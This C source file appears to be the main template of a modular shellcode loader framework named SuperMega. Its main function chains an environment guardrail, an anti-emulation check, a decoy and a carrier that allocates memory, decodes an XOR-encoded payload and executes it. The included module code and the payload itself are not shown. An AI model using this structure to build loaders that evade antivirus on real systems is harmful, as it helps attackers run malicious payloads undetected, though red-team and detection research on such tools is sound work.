/* SuperMega Modular Loader Template
 * 
 * This file serves as the skeleton. The AutoMutate (or build system) 
 * will inject the specific module implementations into this file 
 * (or compile them together).
 * 
 * PLACEHOLDERS:
 *  - {{HEADER_INCLUDES}}: Additional headers if needed
 *  - {{MODULE_ANTIEMULATION}}: The anti-emulation function body/file
 *  - {{MODULE_DECODER}}: The decoder function body/file
 *  - {{MODULE_CARRIER}}: The carrier function body/file
 *  - {{MODULE_GUARDRAIL}}: The guardrail function body/file
 */

#include <windows.h>
#include <stdio.h>
#include "payload.h"
#include "modules/header/definitions.h"

// ============================================================================
// MODULE IMPLEMENTATIONS
// ============================================================================
// The build system should replace these includes with the actual code, 
// or ensure the files exist relative to this one.

// DEFAULT SELECTIONS (Can be overridden by build system)
#ifndef SELECTED_ANTIEMULATION
#include "modules/antiemulation/sirallocalot.c"
#else
#include SELECTED_ANTIEMULATION
#endif

#ifndef SELECTED_GUARDRAIL
#include "modules/guardrails/env.c"
#else
#include SELECTED_GUARDRAIL
#endif

#ifndef SELECTED_DECODER
// Default to XOR (ensure payload.h matches!)
#include "modules/decoder/xor.c"
#else
#include SELECTED_DECODER
#endif

#ifndef SELECTED_VIRTUALPROTECT
// Default to Standard
#include "modules/virtualprotect/standard.c"
#else
#include SELECTED_VIRTUALPROTECT
#endif

#ifndef SELECTED_DECOY
// Default to None
#include "modules/decoy/none.c"
#else
#include SELECTED_DECOY
#endif


#ifndef SELECTED_CARRIER
#include "modules/carrier/alloc_rw_rx.c"
#else
#include SELECTED_CARRIER
#endif

// ============================================================================
// MAIN ENTRY
// ============================================================================

int main() {
    // 1. Guardrail
    if (guardrail() != 0) {
        return 1; 
    }

    // 2. Anti-Emulation
    antiemulation();

    // 3. Decoy
    decoy();

    // 4. Carrier (Handles Alloc -> Decode -> Protect -> Exec)
    if (carrier() != 0) {
        return 1; // Error
    }

    return 0;
}
